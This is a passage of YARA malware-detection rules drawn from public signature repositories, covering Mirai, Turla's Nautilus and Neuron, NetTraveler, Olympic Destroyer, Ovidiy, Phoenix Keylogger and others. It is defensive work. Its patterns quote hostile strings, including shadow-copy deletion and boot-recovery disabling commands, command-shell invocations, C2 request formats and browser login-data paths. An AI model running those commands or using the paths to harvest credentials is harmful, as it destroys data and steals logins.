vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Mirai_1_May17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"GET /bins/mirai.x86 HTTP/1.0\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 5000KB and all of them)\n}\n\nrule Miari_2_May17\n{\n    meta:\n        description = \"Mirai bot\"\n        threat_names = \"Mirai\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Miari_2_May17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36\" fullword ascii\n        $s2 = \"GET /g.php HTTP/1.1\" fullword ascii\n        $s3 = \"https://%[^/]/%s\" fullword ascii\n        $s4 = \"pass\\\" value=\\\"[^\\\"]*\\\"\" fullword ascii\n        $s5 = \"jbeupq84v7.2y.net\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 5000KB and 2 of them)\n}\n\nrule Mozart\n{\n    meta:\n        description = \"Mozart POS RAM scraper\"\n        ref = \"http://securitykitten.github.io/the-mozart-ram-scraper/\"\n        classifications = \"Spyware\"\n        threat_names = \"Mozart\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Nick Hoffman - Morphick Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Mozart\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $pdb = \"z:\\\\Slender\\\\mozart\\\\mozart\\\\Release\\\\mozart.pdb\" nocase wide ascii\n        $output = {67 61 72 62 61 67 65 2E 74 6D 70 00}\n        $service_name = \"NCR SelfServ Platform Remote Monitor\" nocase wide ascii\n        $service_name_short = \"NCR_RemoteMonitor\"\n        $encode_data = {B8 08 10 00 00 E8 ?? ?? ?? ?? A1 ?? ?? ?? ?? 53 55 8B AC 24 14 10 00 00 89 84 24 0C 10 00 00 56 8B C5 33 F6 33 DB 8D 50 01 8D A4 24 00 00 00 00 8A 08 40 84 C9 ?? ?? 2B C2 89 44 24 0C ?? ?? 8B 94 24 1C 10 00 00 57 8B FD 2B FA 89 7C 24 10 ?? ?? 8B 7C 24 10 8A 04 17 02 86 E0 BA 40 00 88 02 B8 ?? ?? ?? ?? 46 8D 78 01 8D A4 24 00 00 00 00 8A 08 40 84 C9 ?? ?? 2B C7 3B F0 ?? ?? 33 F6 8B C5 43 42 8D 78 01 8A 08 40 84 C9 ?? ?? 2B C7 3B D8 ?? ?? 5F 8B B4 24 1C 10 00 00 8B C5 C6 04 33 00 8D 50 01 8A 08 40 84 C9 ?? ?? 8B 8C 24 20 10 00 00 2B C2 51 8D 54 24 14 52 50 56 E8 ?? ?? ?? ?? 83 C4 10 8B D6 5E 8D 44 24 0C 8B C8 5D 2B D1 5B 8A 08 88 0C 02 40 84 C9 ?? ?? 8B 8C 24 04 10 00 00 E8 ?? ?? ?? ?? 81 C4 08 10 00 00}\n\n    condition:\n        any of ($pdb , $output , $encode_data) or all of ($service*)\n}\n\nrule Nautilus_modified_rc4_loop\n{\n    meta:\n        description = \"Nautilus backdoor\"\n        ref = \"https://www.ncsc.gov.uk/alerts/turla-group-malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"Nautilus, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC UK\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Nautilus_modified_rc4_loop\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = {42 0F B6 14 04 41 FF C0 03 D7 0F B6 CA 8A 14 0C 43 32 14 13 41 88 12 49 FF C2 49 FF C9}\n\n    condition:\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $a\n}\n\nrule Nautilus_rc4_key\n{\n    meta:\n        description = \"Nautilus backdoor RC4 key\"\n        ref = \"https://www.ncsc.gov.uk/alerts/turla-group-malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"Nautilus, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC UK\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Nautilus_rc4_key\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $key = {31 42 31 34 34 30 44 39 30 46 43 39 42 43 42 34 36 41 39 41 43 39 36 34 33 38 46 45 45 41 38 42}\n\n    condition:\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $key\n}\n\nrule Nautilus_common_strings\n{\n    meta:\n        description = \"Nautilus backdoor\"\n        ref = \"https://www.ncsc.gov.uk/alerts/turla-group-malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"Nautilus, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC UK\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Nautilus_common_strings\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $ = \"nautilus-service.dll\" ascii\n        $ = \"oxygen.dll\" ascii\n        $ = \"config_listen.system\" ascii\n        $ = \"ctx.system\" ascii\n        $ = \"3FDA3998-BEF5-426D-82D8-1A71F29ADDC3\" ascii\n        $ = \"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Caches\\\\{%s}.2.ver0x0000000000000001.db\" ascii\n\n    condition:\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and 3 of them\n}\n\nrule Nautilus_forensic_artificats\n{\n    meta:\n        description = \"Nautilus backdoor\"\n        ref = \"https://www.ncsc.gov.uk/alerts/turla-group-malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"Nautilus, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC UK / Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Nautilus_forensic_artificats\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $ = \"App_Web_juvjerf3.dll\" fullword ascii\n        $ = \"App_Web_vcplrg8q.dll\" fullword ascii\n        $ = \"ar_all2.txt\" fullword ascii\n        $ = \"ar_sa.txt\" fullword ascii\n        $ = \"Convert.FromBase64String(temp[1])\" fullword ascii\n        $ = \"D68gq#5p0(3Ndsk!\" fullword ascii\n        $ = \"dcomnetsrv\" fullword ascii\n        $ = \"errorfe.aspx.f5dba9b9.compiled\" fullword ascii\n        $ = \"ERRORF~1.ASP\" fullword ascii\n        $ = \"intelliAdminRpc\" fullword ascii\n        $ = \"J8fs4F4rnP7nFl#f\" fullword ascii\n        $ = \"Msnb.exe\" fullword ascii\n        $ = \"nautilus-service.dll\"\n        $ = \"Neuron_service\" fullword ascii\n        $ = \"owa.exe\" fullword ascii\n        $ = \"owa_ar2.bat\" fullword ascii\n        $ = \"payload.x64.dll.system\" fullword ascii\n        $ = \"service.x64.dll.system\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nprivate rule NetTravExports : NetTraveler Family\n{\n    meta:\n        description = \"Export names for dll component\"\n        classifications = \"Spyware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Katie Kleemola\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"NetTravExports\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = \"?InjectDll@@YAHPAUHWND__@@K@Z\"\n        $ = \"?UnmapDll@@YAHXZ\"\n        $ = \"?g_bSubclassed@@3HA\"\n\n    condition:\n        any of them\n}\n\nprivate rule NetTravStrings : NetTraveler Family\n{\n    meta:\n        description = \"Identifiers for NetTraveler DLL\"\n        classifications = \"Spyware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Katie Kleemola\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"NetTravStrings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = \"?action=updated&hostid=\"\n        $ = \"travlerbackinfo\"\n        $ = \"?action=getcmd&hostid=\"\n        $ = \"%s?action=gotcmd&hostid=\"\n        $ = \"%s?hostid=%s&hostname=%s&hostip=%s&filename=%s&filestart=%u&filetext=\"\n        $ = \"\\x00Method1 Fail!!!!!\\x00\"\n        $ = \"\\x00Method3 Fail!!!!!\\x00\"\n        $ = \"\\x00method currect:\\x00\"\n        $ = /\\x00\\x00[\\w\\-]+ is Running!\\x00\\x00/\n        $ = \"\\x00OtherTwo\\x00\"\n\n    condition:\n        any of them\n}\n\nprivate rule NetpassStrings : NetPass Variant\n{\n    meta:\n        description = \"Identifiers for netpass variant\"\n        classifications = \"Spyware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Katie Kleemola\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"NetpassStrings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $exif1 = \"Device Protect ApplicatioN\" wide\n        $exif2 = \"beep.sys\" wide\n        $exif3 = \"BEEP Driver\" wide\n        $string1 = \"\\x00NetPass Update\\x00\"\n        $string2 = \"\\x00%s:DOWNLOAD\\x00\"\n        $string3 = \"\\x00%s:UPDATE\\x00\"\n        $string4 = \"\\x00%s:uNINSTALL\\x00\"\n\n    condition:\n        all of ($exif*) or any of ($string*)\n}\n\nrule NetTraveler : Family\n{\n    meta:\n        description = \"NetTraveler / TravNet spyware\"\n        classifications = \"Spyware\"\n        threat_names = \"NetTraveler\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Katie Kleemola\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"NetTraveler\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        NetTravExports or NetTravStrings or NetpassStrings\n}\n\nrule Neuron2_loader_strings : Turla APT loader\n{\n    meta:\n        description = \"Neuron malware loader\"\n        ref = \"https://www.ncsc.gov.uk/alerts/turla-group-malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"Neuron, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"MW_neuron2_loader_strings\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ = \"dcom_api\" ascii\n        $ = \"http://*:80/OWA/OAB/\" ascii\n        $ = \"https://*:443/OWA/OAB/\" ascii\n        $ = \"dcomnetsrv.cpp\" wide\n        $ = \"dcomnet.dll\" ascii\n        $ = \"D:\\\\Develop\\\\sps\\\\neuron2\\\\x64\\\\Release\\\\dcomnet.pdb\" ascii\n\n    condition:\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and 2 of them\n}\n\nrule Neuron2_decryption_routine : Turla APT\n{\n    meta:\n        description = \"Neuron malware payload decryption\"\n        ref = \"https://www.ncsc.gov.uk/alerts/turla-group-malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"Neuron, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"MW_neuron2_decryption_routine\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ = {81 FA FF 00 00 00 0F B6 C2 0F 46 C2 0F B6 0C 04 48 03 CF 0F B6 D1 8A 0C 14 8D 50 01 43 32 0C 13 41 88 0A 49 FF C2 49 83 E9 01}\n\n    condition:\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and all of them\n}\n\nrule Neuron2_dotnet_strings : Turla APT\n{\n    meta:\n        description = \"Neuron malware payload\"\n        ref = \"https://www.ncsc.gov.uk/alerts/turla-group-malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"Neuron, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"MW_neuron2_dotnet_strings\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $dotnetMagic = \"BSJB\" ascii\n        $s1 = \"http://*:80/W3SVC/\" wide\n        $s2 = \"https://*:443/W3SVC/\" wide\n        $s3 = \"neuron2.exe\" ascii\n        $s4 = \"D:\\\\Develop\\\\sps\\\\neuron2\\\\neuron2\\\\obj\\\\Release\\\\neuron2.pdb\" ascii\n\n    condition:\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $dotnetMagic and 2 of ($s*)\n}\n\nrule Neuron_common_strings\n{\n    meta:\n        description = \"Neuron malware\"\n        ref = \"https://www.ncsc.gov.uk/alerts/turla-group-malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"Neuron, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC UK\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Neuron_common_strings\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $strServiceName = \"MSExchangeService\" ascii\n        $strReqParameter_1 = \"cadataKey\" wide\n        $strReqParameter_2 = \"cid\" wide\n        $strReqParameter_3 = \"cadata\" wide\n        $strReqParameter_4 = \"cadataSig\" wide\n        $strEmbeddedKey = \"PFJTQUtleVZhbHVlPjxNb2R1bHVzPnZ3WXRKcnNRZjVTcCtWVG9Rb2xuaEVkMHVwWDFrVElFTUNTNEFnRkRCclNm clpKS0owN3BYYjh2b2FxdUtseXF2RzBJcHV0YXhDMVRYazRoeFNrdEpzbHljU3RFaHBUc1l4OVBEcURabVVZVklVb HlwSFN1K3ljWUJWVFdubTZmN0JTNW1pYnM0UWhMZElRbnl1ajFMQyt6TUhwZ0xmdEc2b1d5b0hyd1ZNaz08L01vZH VsdXM+PEV4cG9uZW50PkFRQUI8L0V4cG9uZW50PjwvUlNBS2V5VmFsdWU+\" wide\n        $strDefaultKey = \"8d963325-01b8-4671-8e82-d0904275ab06\" wide\n        $strIdentifier = \"MSXEWS\" wide\n        $strListenEndpoint = \"443/ews/exchange/\" wide\n        $strB64RegKeySubstring = \"U09GVFdBUkVcTWljcm9zb2Z0XENyeXB0b2dyYXBo\" wide\n        $strName = \"neuron_service\" ascii\n        $dotnetMagic = \"BSJB\" ascii\n\n    condition:\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $dotnetMagic and 6 of ($str*)\n}\n\nrule Neuron_standalone_signature\n{\n    meta:\n        description = \"Neuron malware\"\n        ref = \"https://www.ncsc.gov.uk/alerts/turla-group-malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"Neuron, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC UK\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Neuron_standalone_signature\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = { eb073d151231011234080e12818d1d051281311d1281211d1281211d128121081d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281211d1281 }\n        $dotnetMagic = \"BSJB\" ascii\n\n    condition:\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and all of them\n}\n\nrule Suckfly_Nidiran_Gen_1\n{\n    meta:\n        description = \"Nidiran backdoor\"\n        ref = \"https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Nidiran\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Suckfly_Nidiran_Gen_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"WriteProcessMemory fail at %d \" fullword ascii\n        $s2 = \"CreateRemoteThread fail at %d \" fullword ascii\n        $s3 = \"CreateRemoteThread Succ\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule Suckfly_Nidiran_Gen_2\n{\n    meta:\n        description = \"Nidiran backdoor\"\n        ref = \"https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Nidiran\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Suckfly_Nidiran_Gen_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"WorkDll.dll\" fullword ascii\n        $x2 = \"%userprofile%\\\\Security Center\\\\secriter.dll\" fullword ascii\n        $s1 = \"DLL_PROCESS_ATTACH is called\" fullword ascii\n        $s2 = \"Support Security Accounts Manager For Microsoft Windows.If this service is stopped, any services that depended on it will fail t\" ascii\n        $s3 = \"before CreateRemoteThread\" fullword ascii\n        $s4 = \"CreateRemoteThread Succ\" fullword ascii\n        $s5 = \"Microsoft Security Accounts Manager\" fullword ascii\n        $s6 = \"DoRunRemote\" fullword ascii\n        $s7 = \"AutoRunFun\" fullword ascii\n        $s8 = \"ServiceMain is called\" fullword ascii\n        $s9 = \"DllRegisterServer is called\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and (1 of ($x*) or 4 of them)\n}\n\nrule Suckfly_Nidiran_Gen_3\n{\n    meta:\n        description = \"Nidiran backdoor\"\n        ref = \"https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Nidiran\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Suckfly_Nidiran_Gen_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"RUN SHELLCODE FAIL\" fullword ascii\n        $x2 = \"RUN PROCESS FAILD!\" fullword ascii\n        $x3 = \"DOWNLOAD FILE FAILD\" fullword ascii\n        $x4 = \"MODIFYCONFIG FAIL!\" fullword ascii\n        $x5 = \"GetFileAttributes FILE FAILD\" fullword ascii\n        $x6 = \"MODIFYCONFIG SUCC!\" fullword ascii\n        $s1 = \"cmd.exe /c %s\" fullword ascii\n        $s2 = \"error to create pipe!\" fullword ascii\n        $s3 = \"%s\\\\%08x.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"ae0f4ebf7e8ce91d6548318a3cf82b7a\" or 1 of ($x*) or 2 of them)\n}\n\nrule NionSpy : win32\n{\n    meta:\n        description = \"NionSpy spyware\"\n        ref = \"https://blogs.mcafee.com/mcafee-labs/taking-a-close-look-at-data-stealing-nionspy-file-infector\"\n        classifications = \"Spyware\"\n        threat_names = \"NionSpy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"NionSpy\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $variant2015_infmarker = \"aCfG92KXpcSo4Y94BnUrFmnNk27EhW6CqP5EnT\"\n        $variant2013_infmarker = \"ad6af8bd5835d19cc7fdc4c62fdf02a1\"\n        $variant2013_string = \"%s?cstorage=shell&comp=%s\"\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 1 of ($variant*)\n}\n\nrule Odinaff_swift : malware odinaff swift raw\n{\n    meta:\n        description = \"Odinaff trojan\"\n        ref = \"https://www.symantec.com/security_response/writeup.jsp?docid=2016-083006-4847-99\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Odinaff\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@j0sm1\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Odinaff_swift\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"getapula.pdb\"\n        $i1 = \"wtsapi32.dll\"\n        $i2 = \"cmpbk32.dll\"\n        $i3 = \"PostMessageA\"\n        $i4 = \"PeekMessageW\"\n        $i5 = \"DispatchMessageW\"\n        $i6 = \"WTSEnumerateSessionsA\"\n\n    condition:\n        ($s1 or pe.exports(\"Tyman32\")) and (2 of ($i*))\n}\n\nrule OlympicDestroyer_Gen1\n{\n    meta:\n        description = \"Olympic Destroyer destructive malware\"\n        ref = \"http://blog.talosintelligence.com/2018/02/olympic-destroyer.html\"\n        classifications = \"Worm\"\n        threat_names = \"Olympic Destroyer\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Destructive_Ransomware_Gen1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"/set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no\" fullword wide\n        $x2 = \"delete shadows /all /quiet\" fullword wide\n        $x3 = \"delete catalog -quiet\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 1 of them\n}\n\nrule OlympicDestroyer_Gen2\n{\n    meta:\n        description = \"Olympic Destroyer destructive malware\"\n        ref = \"http://blog.talosintelligence.com/2018/02/olympic-destroyer.html\"\n        classifications = \"Worm\"\n        threat_names = \"Olympic Destroyer\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OlympicDestroyer_Gen2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"cmd.exe /c (ping 0.0.0.0 > nul) && if exist %programdata%\\\\evtchk.txt\" fullword wide\n        $x2 = \"cmd.exe /c (echo strPath = Wscript.ScriptFullName & echo.Set FSO = CreateObject^(\\\"Scripting.FileSystemObject\\\"^)\" wide\n        $x3 = \"del %programdata%\\\\evtchk.txt\" fullword wide\n        $x4 = \"Pyeongchang2018.com\\\\svc_all_swd_installc\" fullword ascii\n        $s1 = \"<STARTCRED>\" fullword wide\n        $s2 = \"SELECT ds_cn FROM ds_computer\" fullword wide\n        $s3 = \"\\\\system32\\\\notepad.exe\" fullword wide\n        $s4 = \"%s \\\\\\\\%s -u \\\"%s\\\" -p \\\"%s\\\" -accepteula -d %s %s \\\"%s\\\"\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 5000KB and (pe.imphash() == \"fd7200dcd5c0d9d4d277a26d951210aa\" or pe.imphash() == \"975087e9286238a80895b195efb3968d\" or pe.imphash() == \"da1c2d7acfe54df797bfb1f470257bc3\" or 1 of ($x*) or 3 of them)\n}\n\nrule ovidiy\n{\n    meta:\n        description = \"Ovidiy credential stealer\"\n        ref = \"https://www.proofpoint.com/us/threat-insight/post/meet-ovidiy-stealer-bringing-credential-theft-masses\"\n        classifications = \"Spyware\"\n        threat_names = \"Ovidiy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"tjadanel @reonfleek\"\n        source = \"https://github.com/tjnel/yara_repo\"\n        original_name = \"ovidiy\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $ovidiy0 = \"ovidiy\" nocase\n        $ovidiy1 = \"Ovidiy.exe\" ascii\n        $dotnet0 = \"System.Net\" ascii\n        $dotnet1 = \"AssemblyFileVersionAttribute\" ascii\n        $dotnet2 = \"System.IO\" ascii\n        $dotnet3 = \"GuidAttribute\" ascii\n        $dotnet4 = \"System.Runtime.CompilerServices\" ascii\n        $dotnet5 = \"CRYPT32.dlL\" ascii\n        $obfuscator0 = \"ConfuserEx v\" ascii\n        $obfuscator1 = \"Ovidiy.g.resources\" ascii\n        $obfuscator2 = \"<Module>\" ascii\n        $plaintext0 = \"get_Login\"\n        $plaintext1 = \"set_Login\"\n        $plaintext2 = \"get_Password\"\n        $plaintext3 = \"set_Password\"\n        $plaintext4 = \"get_SimpleUid\"\n\n    condition:\n        (uint16(0) == 0x5A4D) and (4 of ($dotnet*)) and (all of ($ovidiy*)) and ((2 of ($obfuscator*) or (all of ($plaintext*))))\n}\n\nrule pbot_strings\n{\n    meta:\n        description = \"pBot malware\"\n        classifications = \"Bot\"\n        threat_names = \"pBot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"pbot_strings\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $config = \"var $config = array\"\n        $c = \"class pBot\"\n\n    condition:\n        all of them\n}\n\nrule PhoenixKeylogger\n{\n    meta:\n        description = \"Phoenix Keylogger\"\n        threat_names = \"Phoenix\"\n        classifications = \"Keylogger,Spyware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"Vmmouse.sys\" wide ascii\n        $s2 = \"vm3dgl.dll\" wide ascii\n        $s3 = \"vmtray.dll\" wide ascii\n        $s4 = \"VMToolsHook.dll\" wide ascii\n        $s5 = \"vmmousever.dll\" wide ascii\n        $s6 = \"VBoxMouse.sys\" wide ascii\n        $s7 = \"VBoxGuest.sys\" wide ascii\n        $s8 = \"VBoxSF.sys\" wide ascii\n        $s9 = \"VBoxVideo.sys\" wide ascii\n        $s10 = \"vboxservice.exe\" wide ascii\n        $s11 = \"IMAP Password\" wide ascii\n        $s12 = \"POP3 Password\" wide ascii\n        $s13 = \"HTTP Password\" wide ascii\n        $s14 = \"SMTP Password\" wide ascii\n\n        $d1 = \"\\\\Blisk\\\\User Data\\\\Default\\\\Login Data\" wide ascii\n        $d2 = \"\\\\Vivaldi\\\\User Data\\\\Default\\\\login data\" wide ascii\n        $d3 = \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\login data\" wide ascii\n        $d4 = \"\\\\Epic Privacy Browser\\\\User Data\\\\Default\\\\Login Data\" wide ascii\n        $d5 = \"\\\\UCBrowser\\\\User Data_i18n\\\\Default\\\\UC Login Data.18\" wide ascii\n        $d6 = \"\\\\CocCoc\\\\Browser\\\\User Data\\\\Default\\\\Login Data\" wide ascii\n        $d7 = 